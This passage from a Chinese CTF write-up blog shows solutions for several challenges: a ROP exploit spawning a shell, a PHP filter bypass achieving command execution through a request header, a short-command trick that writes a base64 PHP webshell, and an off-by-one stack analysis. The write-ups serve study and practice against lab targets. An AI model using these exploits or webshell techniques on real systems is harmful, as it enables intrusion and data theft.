class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.sendline(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendlineafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">x, y</span>): <span class="keyword">return</span> proc.sendafter(x, y)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> proc.recvuntil(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc</span>(): <span class="keyword">return</span> proc.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> proc.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">li</span>(<span class="params">con</span>): <span class="keyword">return</span> log.info(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>(<span class="params">con</span>): <span class="keyword">return</span> log.success(con)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pi</span>(): <span class="keyword">return</span> proc.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pcls</span>(): <span class="keyword">return</span> proc.close()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ga</span>(): <span class="keyword">return</span> u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">gscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    set env DEBUG=1</span></span><br><span class="line"><span class="string">    b * 0x0000000000400BB4</span></span><br><span class="line"><span class="string">    # b * 0x0000000000400C7A</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> + <span class="string">&#x27;c\n&#x27;</span> * <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> mode == <span class="string">&#x27;-d&#x27;</span>:</span><br><span class="line">    gdb.attach(proc, gdbscript=gscript)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400C46</span></span><br><span class="line">bss = <span class="number">0x6BB300</span></span><br><span class="line">syscall = <span class="number">0x000000000040132c</span></span><br><span class="line"></span><br><span class="line">rax_ret = <span class="number">0x0000000000415f04</span></span><br><span class="line">rdi_ret = <span class="number">0x0000000000400686</span></span><br><span class="line">rsi_ret = <span class="number">0x0000000000410a93</span></span><br><span class="line">rdx_ret = <span class="number">0x000000000044a155</span></span><br><span class="line">rdx_rsi_ret = <span class="number">0x000000000044c6d9</span></span><br><span class="line">ret = <span class="number">0x0000000000400416</span></span><br><span class="line">read = <span class="number">0x000000000044A140</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;say?&#x27;</span>, <span class="string">b&#x27;257&#x27;</span>)</span><br><span class="line">payload = p64(ret) * <span class="number">13</span></span><br><span class="line">payload += p64(rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(rdx_rsi_ret) + p64(<span class="number">8</span>) + p64(bss)</span><br><span class="line">payload += p64(read)</span><br><span class="line"></span><br><span class="line">payload += p64(rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(rdi_ret) + p64(bss) + p64(rdx_rsi_ret) + p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;yourself?&#x27;</span>, payload.ljust(<span class="number">257</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">sl(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pi()</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/10/10/dcquals2019-speedrun-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/10/极客大挑战2020-rceme-wp/" >极客大挑战2020-rceme-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-10
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2298">题目链接</a>   </p>
<p>源码提示有<code>swp</code>，访问<code>.index.php.swp</code>成功下载得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]),<span class="number">0</span>,<span class="number">5</span>) !== <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Captcha error~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;code&#x27;</span>] = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>().<span class="title function_ invoke__">sha1</span>(mt_rand)),<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">70</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/ixm&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;alert(\&#x27;Longlone not like you~\&#x27;);history.back()&lt;/script&gt;&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现有md5前5位比对校验，且当前<code>$_SESSION[&#39;code&#39;]</code>在页面中也有展现   因此可以爆破   然后就是无参函数构造了</p>
<blockquote>
<p>爆破哈希可以查看生日攻击：<a target="_blank" rel="noopener" href="http://ruanyifeng.com/blog/2018/09/hash-collision-and-birthday-attack.html">哈希碰撞与生日攻击 - 阮一峰的网络日志 (ruanyifeng.com)</a></p>
<p>无参函数构造可见：<a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/09/26/HNCTF2022-Canyource-wp/">https://antel0p3.github.io/2023/09/26/HNCTF2022-Canyource-wp/</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">one</span>(<span class="params">s</span>):		</span><br><span class="line">    ss = <span class="string">b&quot;[~&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += (<span class="number">255</span> - <span class="built_in">ord</span>(each)).to_bytes(<span class="number">1</span>, <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">    ss += <span class="string">b&quot;][~\xCF](&quot;</span></span><br><span class="line">    <span class="keyword">return</span> ss</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_not</span>(<span class="params">a</span>):	<span class="comment"># 将命令转为[~\x8F\x8D\x96\x91\x8B\xA0\x8D][~\xCF]();的形式</span></span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>]:</span><br><span class="line">        s += one(each)</span><br><span class="line">    s += <span class="string">b&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">b&quot;;&quot;</span></span><br><span class="line">    <span class="comment"># print(s)</span></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28583/&#x27;</span></span><br><span class="line">sess = requests.session()	<span class="comment"># 注意这里用session()是为了保持会话状态</span></span><br><span class="line">res = sess.get(url=url)</span><br><span class="line"><span class="built_in">sum</span> = re.findall(<span class="string">&#x27;,0,5[)]==(.....)&#x27;</span>, res.text)[<span class="number">0</span>]	<span class="comment"># 获取5位哈希值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;&#x27;</span>	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">800000</span>):	<span class="comment"># 爆破  不成功多试几次</span></span><br><span class="line">    md5 = hashlib.md5(<span class="built_in">str</span>(i).encode())</span><br><span class="line">    <span class="keyword">if</span> md5.hexdigest()[:<span class="number">5</span>] == <span class="built_in">sum</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        code = i</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">res = sess.post(url=url, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;phpinfo();&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<p>成功获取到phpinfo结果  渲染后查看  <code>disabled_functions</code>中没有禁用函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">res = sess.post(url=url, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;print_r(getallheaders());&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># Array (</span></span><br><span class="line"><span class="comment">#    [Host] =&gt; node4.anna.nssctf.cn:28583</span></span><br><span class="line"><span class="comment">#    [User-Agent] =&gt; python-requests/2.31.0</span></span><br><span class="line"><span class="comment">#    ...)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ls&quot;</span>&#125;	<span class="comment"># 这里放要执行的命令</span></span><br><span class="line">res = sess.post(url=url, headers=headers, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;print_r(getallheaders());&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># Array (</span></span><br><span class="line"><span class="comment">#    [Host] =&gt; node4.anna.nssctf.cn:28583</span></span><br><span class="line"><span class="comment">#    [User-Agent] =&gt; ls</span></span><br><span class="line"><span class="comment">#    ...)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ls&quot;</span>&#125;</span><br><span class="line">res = sess.post(url=url, headers=headers, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;print_r(next(getallheaders()));&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># ls</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;ls /;cat /fll*&quot;</span>&#125;</span><br><span class="line">res = sess.post(url=url, headers=headers, data=&#123;<span class="string">&quot;cmd&quot;</span>:get_not(<span class="string">&#x27;system(next(getallheaders()));&#x27;</span>), <span class="string">&quot;code&quot;</span>:code&#125;)</span><br><span class="line"><span class="comment"># flll1114gggggg ...</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/10/10/极客大挑战2020-rceme-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/10/07/UUCTF2022-ezrce-wp/" >UUCTF2022-ezrce-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-10-07
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3051">题目链接</a>   </p>
<p>输入command，提交后跳转到post.php<br>POST cmd尝试多次发现命令最长长度只能为6   成功执行会提示在<code>./tmp/</code>下成功执行<br>虽然有的情况下提示执行失败，但实际上是执行了的    所以回显不一定可信</p>
<h2 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">nl</span>		<span class="comment"># 创建一个名为nl的文件</span></span><br><span class="line">* /*&gt;a	<span class="comment"># 第一个*相当于将ls的第一个输出作为命令  剩下的作为参数来执行   即	nl /*&gt;a</span></span><br></pre></td></tr></table></figure>

<h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><p>前置知识</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;file	<span class="comment"># 生成名为file的文件</span></span><br><span class="line">*&gt;a		<span class="comment"># 将ls的第一个输出作为命令  剩下的作为参数来执行</span></span><br><span class="line">sh a	<span class="comment"># 将文件内容作为命令执行</span></span><br><span class="line"><span class="comment"># 换行执行命令：</span></span><br><span class="line">ech\</span><br><span class="line">o\</span><br><span class="line">xxx</span><br></pre></td></tr></table></figure>

<p>例（空文件夹下）</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">dir</span></span><br><span class="line">&gt;sl</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;f\&gt;</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="comment"># dir  &#x27;f&gt;&#x27;   ht-   sl</span></span><br><span class="line">*&gt;v</span><br><span class="line"><span class="comment"># v: f&gt;  ht-  sl</span></span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;0</span><br><span class="line"><span class="comment"># 0: ls  -th  &gt;f</span></span><br><span class="line">sh 0</span><br><span class="line"><span class="built_in">cat</span> f</span><br><span class="line"><span class="comment"># 0 rev v ....</span></span><br></pre></td></tr></table></figure>

<h3 id="5字符RCE写木马脚本"><a href="#5字符RCE写木马脚本" class="headerlink" title="5字符RCE写木马脚本"></a>5字符RCE写木马脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://node5.anna.nssctf.cn:28362/post.php&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;5字符RCE.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;i.strip()&#125;</span>&quot;</span>&#125;</span><br><span class="line">        requests.post(url=url,data=data)</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>字符RCE.txt（写入<span class="number">1.</span>php 木马GET[<span class="number">1</span>]）</span><br><span class="line">&gt;<span class="built_in">dir</span></span><br><span class="line">&gt;sl</span><br><span class="line">&gt;ht-</span><br><span class="line">&gt;f\&gt;</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;<span class="number">0</span></span><br><span class="line">&gt;hp</span><br><span class="line">&gt;<span class="number">1.</span>p\\</span><br><span class="line">&gt;d\&gt;\\</span><br><span class="line">&gt;\ -\\</span><br><span class="line">&gt;e64\\</span><br><span class="line">&gt;bas\\</span><br><span class="line">&gt;<span class="number">7</span>\|\\</span><br><span class="line">&gt;XSk\\</span><br><span class="line">&gt;Fsx\\</span><br><span class="line">&gt;dFV\\</span><br><span class="line">&gt;kX0\\</span><br><span class="line">&gt;bCg\\</span><br><span class="line">&gt;XZh\\</span><br><span class="line">&gt;AgZ\\</span><br><span class="line">&gt;waH\\</span><br><span class="line">&gt;PD9\\</span><br><span class="line">&gt;o\ \\</span><br><span class="line">&gt;ech\\</span><br><span class="line">sh <span class="number">0</span></span><br><span class="line">sh f</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/<span class="number">1</span>.php?<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls /;cat /flag&#x27;</span>);</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/10/07/UUCTF2022-ezrce-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/29/StarCTF2018-note-wp/" >StarCTF2018-note-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-29
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/pwn/stackoverflow/fake_frame/StarCTF2018-note">相关资源</a>  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ checksec note</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fd000)</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *v3;           <span class="comment">// rax</span></span><br><span class="line">    <span class="type">int</span> option;         <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *v5;     <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">    <span class="type">char</span> *file_content; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    setup();</span><br><span class="line">    v5 = <span class="string">&quot;%d&quot;</span>;</span><br><span class="line">    open_file();</span><br><span class="line">    file_content = read_file();</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">int</span>)_isoc99_scanf(v5, &amp;option) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">switch</span> (option) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">            file_content = read256();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Note:%s\n&quot;</span>, file_content);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            save_file(file_content);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Saved!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            fclose(stream);</span><br><span class="line">            v3 = md5(ID);</span><br><span class="line">            unlink(v3);</span><br><span class="line">            open_file();</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">if</span> (stream)</span><br><span class="line">                fclose(stream);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中<code>19#read256</code>   这里存在off_by_one  会在256个字符后写入一个0x00字节  也就是 old_rbp 的末尾</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">read256</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%256s&quot;</span>, s);</span><br><span class="line">  <span class="keyword">return</span> strdup(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><p>先填充0x100字节查看 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x007ffffb03c748│+0x0000: &quot;hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh[...]&quot;	 ← $rsp</span><br><span class="line">[...]</span><br><span class="line">0x007ffffb03c838│+0x00f0: &quot;hhhhhhhhhhhhhhhh&quot;</span><br><span class="line">0x007ffffb03c840│+0x00f8: &quot;hhhhhhhh&quot;</span><br><span class="line">0x007ffffb03c848│+0x0100: 0x007ffffb03c800</span><br><span class="line">0x007ffffb03c850│+0x0108: 0x00000000400ef8  →   mov QWORD PTR [rbp-0x8], rax</span><br></pre></td></tr></table></figure>

<p>可以看到从748写到848，old_rbp被改写成800  也就是返回到main函数时，rbp为800，那么因为参数是基于<code>rbp-0x??</code>来获取的  因此我们在填充字节的时候可以按照偏移给main函数中的变量赋值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> option;         <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *v5;     <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"><span class="type">char</span> *file_content; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br></pre></td></tr></table></figure>

<p><code>v5</code>原值为<code>%d</code>指针，我们可以改成<code>%256s</code>指针，读取option时在当前栈上写入内容</p>
<p><code>file_content</code>可以改为<code>puts@got</code> 选项2时即可输出puts真实地址从而获取libc基地址</p>
<p>也就是<code>748-7f0:b&#39;h&#39;   7f0-7f8:ptr_to_%256s   7f8-800:puts@got </code> </p>
